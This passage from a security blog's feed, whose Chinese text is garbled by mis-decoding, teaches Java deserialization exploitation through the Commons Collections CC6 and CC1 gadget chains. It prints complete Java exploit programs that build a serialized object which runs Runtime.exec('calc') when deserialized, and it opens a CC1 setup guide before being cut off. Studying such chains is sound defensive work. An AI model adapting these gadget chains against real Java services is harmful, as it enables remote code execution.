title="é—®é¢˜äºŒï¼šåºåˆ—åŒ–çš„æ—¶å€™ï¼Œå°±èƒ½å¤Ÿå¼¹å‡ºè®¡ç®—å™¨"></a>é—®é¢˜äºŒï¼šåºåˆ—åŒ–çš„æ—¶å€™ï¼Œå°±èƒ½å¤Ÿå¼¹å‡ºè®¡ç®—å™¨</h4><p>åŸå› ï¼šåœ¨æ‰§è¡Œputæ–¹æ³•æ—¶ï¼Œå°±ä¼šè°ƒç”¨hashæ–¹æ³•-&gt;hashCodeï¼Œèµ°åŸæœ¬é“¾å­çš„æµç¨‹æœ€åå¼¹å‡ºè®¡ç®—å™¨</p><p>è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å°±å°‘äº†æ­¤é“¾çš„å…¥å£ç‚¹ï¼ŒreadObjectæ–¹æ³•ï¼Œè¿™æ¡é“¾ä¸å®Œæ•´</p><p>ä¸ URLDNS ä¸­çš„ä¸åŒï¼Œæœ‰äº›é“¾å­å¯ä»¥é€šè¿‡è®¾ç½®å‚æ•°ä¿®æ”¹ï¼Œæœ‰äº›åˆ™ä¸è¡Œã€‚åœ¨æˆ‘ä»¬ CC6 çš„é“¾å­å½“ä¸­ï¼Œé€šè¿‡ä¿®æ”¹è¿™ä¸€å¥è¯­å¥ <code>Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</code>ï¼Œå¯ä»¥è¾¾åˆ°æˆ‘ä»¬éœ€è¦çš„æ•ˆæœã€‚</p><p>æˆ‘ä»¬ä¹‹å‰ä¼ è¿›å»çš„å‚æ•°æ˜¯ <code>chainedTransformer</code>ï¼Œæˆ‘ä»¬åœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼ è¿›å»ä¸€ä¸ªæ²¡ç”¨çš„ä¸œè¥¿ï¼Œå†åœ¨ååºåˆ—åŒ–çš„æ—¶å€™é€šè¿‡åå°„ï¼Œå°†å…¶ä¿®æ”¹å› <code>chainedTransformer</code>ã€‚ç›¸å…³çš„å±æ€§å€¼åœ¨ LazyMap å½“ä¸­ä¸º <code>factory</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException &#123;<br>        <span class="hljs-comment">//å±é™©å‚æ•°æ„é€ </span><br>        <span class="hljs-comment">//å±é™©æ–¹æ³•ï¼Œæ ¸å¿ƒå±é™©å‚æ•°æ„é€ </span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//è§¦å‘æ”»å‡»é“¾å­</span><br>                <span class="hljs-comment">//å…¶å®è¿™é‡Œå¯ä»¥ä¸ç”¨è¿™ä¸ªï¼Œå› ä¸ºæˆ‘ä»¬ä¸å†éœ€è¦è¿›å…¥setValueæ–¹æ³•</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šé€šè¿‡åå°„è·å–Runtimeç±»çš„getRuntimeæ–¹æ³•</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šè°ƒç”¨getRuntimeæ–¹æ³•è·å–Runtimeå®ä¾‹</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// ç¬¬ä¸‰æ­¥ï¼šåœ¨Runtimeå®ä¾‹ä¸Šè°ƒç”¨execæ–¹æ³•æ‰§è¡Œè®¡ç®—å™¨</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">// å°†ä¸‰ä¸ªTransformerç»„åˆæˆé“¾å¼è½¬æ¢å™¨</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-comment">//ç”ŸæˆLazyMapå®ä¾‹</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//å…ˆä¼ å…¥ä¸€ä¸ªæ²¡æœ‰ç”¨çš„transformer</span><br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-comment">//æ–°å»ºTiedMapEntryå®ä¾‹</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;zac&quot;</span>);<br>        tiedMapEntry.getValue();<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;sds&quot;</span>);<br><br>        <span class="hljs-comment">//åå°„ä¿®æ”¹lazyMapçš„å‚æ•°factoryçš„å€¼</span><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factory.setAccessible(<span class="hljs-literal">true</span>);<br>        factory.set(lazyMap,chainedTransformer);<br><br><br>        <span class="hljs-comment">// è§¦å‘åºåˆ—åŒ– + ååºåˆ—åŒ–</span><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†æ¬¡æ‰§è¡Œè¿™ä¸ªEXPå‘ç°ï¼Œèµ°åˆ°getæ–¹æ³•åï¼Œå¹¶æ²¡æœ‰èµ°å…¥å¾ªç¯</p><p><img src="/img/CC6/c06.png"></p><p>æ³¨æ„ï¼Œé—®é¢˜è¿˜æ˜¯LazyMapçš„getæ–¹æ³•</p><p>åºåˆ—åŒ–å‰çš„æ“ä½œï¼šå¦‚æœmapæ²¡åŒ…å«è¿™ä¸ªkeyï¼Œé‚£ä¹ˆå°±ç»™mapä¼ å…¥è¿™ä¸ªé”®å€¼å¯¹ã€‚</p><p>è¿™æ ·å°±ä¼šå¯¼è‡´ååºåˆ—åŒ–æ—¶mapé‡Œå·²ç»å­˜åœ¨è¿™ä¸ªkeyäº†ï¼Œæ‰€ä»¥ä¸ä¼šæ‰§è¡Œ<code>factory.transform(key)</code>ï¼Œä»è€Œå¯¼è‡´æ— æ³•å‘½ä»¤æ‰§è¡Œã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦åœ¨hashMap.putä¹‹åï¼ŒæŠŠlazymapçš„leyåˆ é™¤æ‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">lazymap.remove(<span class="hljs-string">&quot;2&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException &#123;<br>        <span class="hljs-comment">//å±é™©å‚æ•°æ„é€ </span><br>        <span class="hljs-comment">//å±é™©æ–¹æ³•ï¼Œæ ¸å¿ƒå±é™©å‚æ•°æ„é€ </span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//è§¦å‘æ”»å‡»é“¾å­</span><br>                <span class="hljs-comment">//å…¶å®è¿™é‡Œå¯ä»¥ä¸ç”¨è¿™ä¸ªï¼Œå› ä¸ºæˆ‘ä»¬ä¸å†éœ€è¦è¿›å…¥setValueæ–¹æ³•</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šé€šè¿‡åå°„è·å–Runtimeç±»çš„getRuntimeæ–¹æ³•</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šè°ƒç”¨getRuntimeæ–¹æ³•è·å–Runtimeå®ä¾‹</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// ç¬¬ä¸‰æ­¥ï¼šåœ¨Runtimeå®ä¾‹ä¸Šè°ƒç”¨execæ–¹æ³•æ‰§è¡Œè®¡ç®—å™¨</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">// å°†ä¸‰ä¸ªTransformerç»„åˆæˆé“¾å¼è½¬æ¢å™¨</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-comment">//ç”ŸæˆLazyMapå®ä¾‹</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//å…ˆä¼ å…¥ä¸€ä¸ªæ²¡æœ‰ç”¨çš„transformer</span><br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-comment">//æ–°å»ºTiedMapEntryå®ä¾‹</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        tiedMapEntry.getValue();<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;bbb&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//åå°„ä¿®æ”¹lazyMapçš„å‚æ•°factoryçš„å€¼</span><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factory.setAccessible(<span class="hljs-literal">true</span>);<br>        factory.set(lazyMap,chainedTransformer);<br><br><br>        <span class="hljs-comment">// è§¦å‘åºåˆ—åŒ– + ååºåˆ—åŒ–</span><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">xxx.readObject()<br>HashMap.put()<br>HashMap.<span class="hljs-built_in">hash</span>()<br>TiedMapEntry.hashCode()<br>TiedMapEntry.getValue()<br>LazyMap.get()<br>ChainedTransformer.transform()<br>InvokerTransformer.transform()<br>Runtime.<span class="hljs-built_in">exec</span>()<br></code></pre></td></tr></table></figure><p><img src="/img/CC6/c07.png"></p>]]></content>
    
    
    <categories>
      
      <category>Javaå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
      <tag>CCé“¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaå®‰å…¨-CC1é“¾</title>
    <link href="/2025/09/03/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BE/"/>
    <url>/2025/09/03/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaå®‰å…¨-CC1é“¾"><a href="#Javaå®‰å…¨-CC1é“¾" class="headerlink" title="Javaå®‰å…¨-CC1é“¾"></a>Javaå®‰å…¨-CC1é“¾</h1><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul><li><a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">JDK8u65</a></li><li>Maven 4.0.0</li></ul><p>åˆ›å»ºä¸€ä¸ª IDEA é¡¹ç›®ï¼Œé€‰ä¸­ mavenï¼Œå¹¶ä½¿ç”¨ jdk8u65</p><p>mavené¡¹ç›®æ¨¡æ¿é€‰æ‹©quickstart</p><p><img src="/img/CC1/c01.png"></p><p>åœ¨é¡¹ç›®ç»“æ„-&gt;æ¨¡å—ä¿®æ”¹è¯­è¨€çº§åˆ«</p><p><img src="/img/CC1/c02.png"></p><p>æ·»åŠ  Maven ä¸­å¯¹ CC1 é“¾çš„ä¾èµ–åŒ…</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>maven clean + maven install</code></p><ul><li>å†è¯´ä¸€è¯´å¦‚ä½•éªŒè¯ç¯å¢ƒå¯¼å…¥æˆåŠŸå§ï¼Œæˆ‘ä»¬ import CC çš„åŒ…</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br></code></pre></td></tr></table></figure><p>å¦‚æœæˆåŠŸè¯´æ˜å®‰è£…æˆåŠŸäº† ~</p><p>æˆ‘ä»¬è¿˜è¦åšä¸€ä»¶äº‹ï¼Œä¿®æ”¹ sun åŒ…</p><p>å› ä¸ºæˆ‘ä»¬æ‰“å¼€æºç ï¼Œå¾ˆå¤šåœ°æ–¹çš„æ–‡ä»¶æ˜¯ .class æ–‡ä»¶ï¼Œæ˜¯å·²ç»ç¼–è¯‘å®Œäº†çš„æ–‡ä»¶ï¼Œéƒ½æ˜¯åç¼–è¯‘ä»£ç ï¼Œæˆ‘ä»¬å¾ˆéš¾è¯»æ‡‚ï¼Œæ‰€ä»¥éœ€è¦æŠŠå®ƒè½¬æ¢ä¸º .java æ–‡ä»¶</p><p> <a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4">openJDK 8u65</a> â€”â€”â€”â€” å»åˆ°è¿™ä¸ªä¸‹è½½é“¾æ¥ï¼Œç‚¹å‡» zip</p><p><img src="/img/CC1/c03.png"></p><p>å°†å…¶è§£å‹ä¹‹åï¼Œå…ˆæä¸€è¾¹ï¼Œæˆ‘ä»¬è§£å‹ jdk8u65 çš„ src.zipï¼Œè§£å‹å®Œä¹‹åï¼Œæˆ‘ä»¬æŠŠ openJDK 8u65 è§£å‹å‡ºæ¥çš„ sun æ–‡ä»¶å¤¹æ‹·è´è¿› jdk8u65 ä¸­ï¼Œè¿™æ ·å­å°±èƒ½æŠŠ .class æ–‡ä»¶è½¬æ¢ä¸º .java æ–‡ä»¶äº†ã€‚</p><p> openJDK 8u65 sunæ–‡ä»¶å¤¹åœ¨jdk-af660750b2f4\src\share\classesè·¯å¾„ä¸‹</p><p>æ‹·è´æˆåŠŸåï¼Œåœ¨IDEA-&gt;File-&gt;é¡¹ç›®ç»“æ„-&gt;SDK-&gt;æºè·¯å¾„ä¸­åŠ å…¥srcæ–‡ä»¶å¤¹</p><p><img src="/img/CC1/c05.png"></p><h2 id="Common-Collections-ç›¸å…³ä»‹ç»"><a href="#Common-Collections-ç›¸å…³ä»‹ç»" class="headerlink" title="Common-Collections ç›¸å…³ä»‹ç»"></a>Common-Collections ç›¸å…³ä»‹ç»</h2><p>å‡ºè‡ªï¼š<a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">Apache Commons CollectionsåŒ…å’Œç®€ä»‹ | é—ªçƒä¹‹ç‹</a></p><p><a href="http://commons.apache.org/">Apache Commons</a>æ˜¯Apacheè½¯ä»¶åŸºé‡‘ä¼šçš„é¡¹ç›®ï¼Œæ›¾ç»éš¶å±äº<code>Jakarta</code>é¡¹ç›®ã€‚<code>Commons</code>çš„ç›®çš„æ˜¯æä¾›å¯é‡ç”¨çš„ã€è§£å†³å„ç§å®é™…çš„é€šç”¨é—®é¢˜ä¸”å¼€æºçš„Javaä»£ç ã€‚Commonsç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š<code>Proper</code>ï¼ˆæ˜¯ä¸€äº›å·²å‘å¸ƒçš„é¡¹ç›®ï¼‰ã€<code>Sandbox</code>ï¼ˆæ˜¯ä¸€äº›æ­£åœ¨å¼€å‘çš„é¡¹ç›®ï¼‰å’Œ<code>Dormant</code>ï¼ˆæ˜¯ä¸€äº›åˆšå¯åŠ¨æˆ–è€…å·²ç»åœæ­¢ç»´æŠ¤çš„é¡¹ç›®ï¼‰ã€‚</p><ul><li>ç®€å•æ¥è¯´ï¼ŒCommon-Collections è¿™ä¸ªé¡¹ç›®å¼€å‘å‡ºæ¥æ˜¯ä¸ºäº†ç»™ Java æ ‡å‡†çš„ <code>Collections API</code> 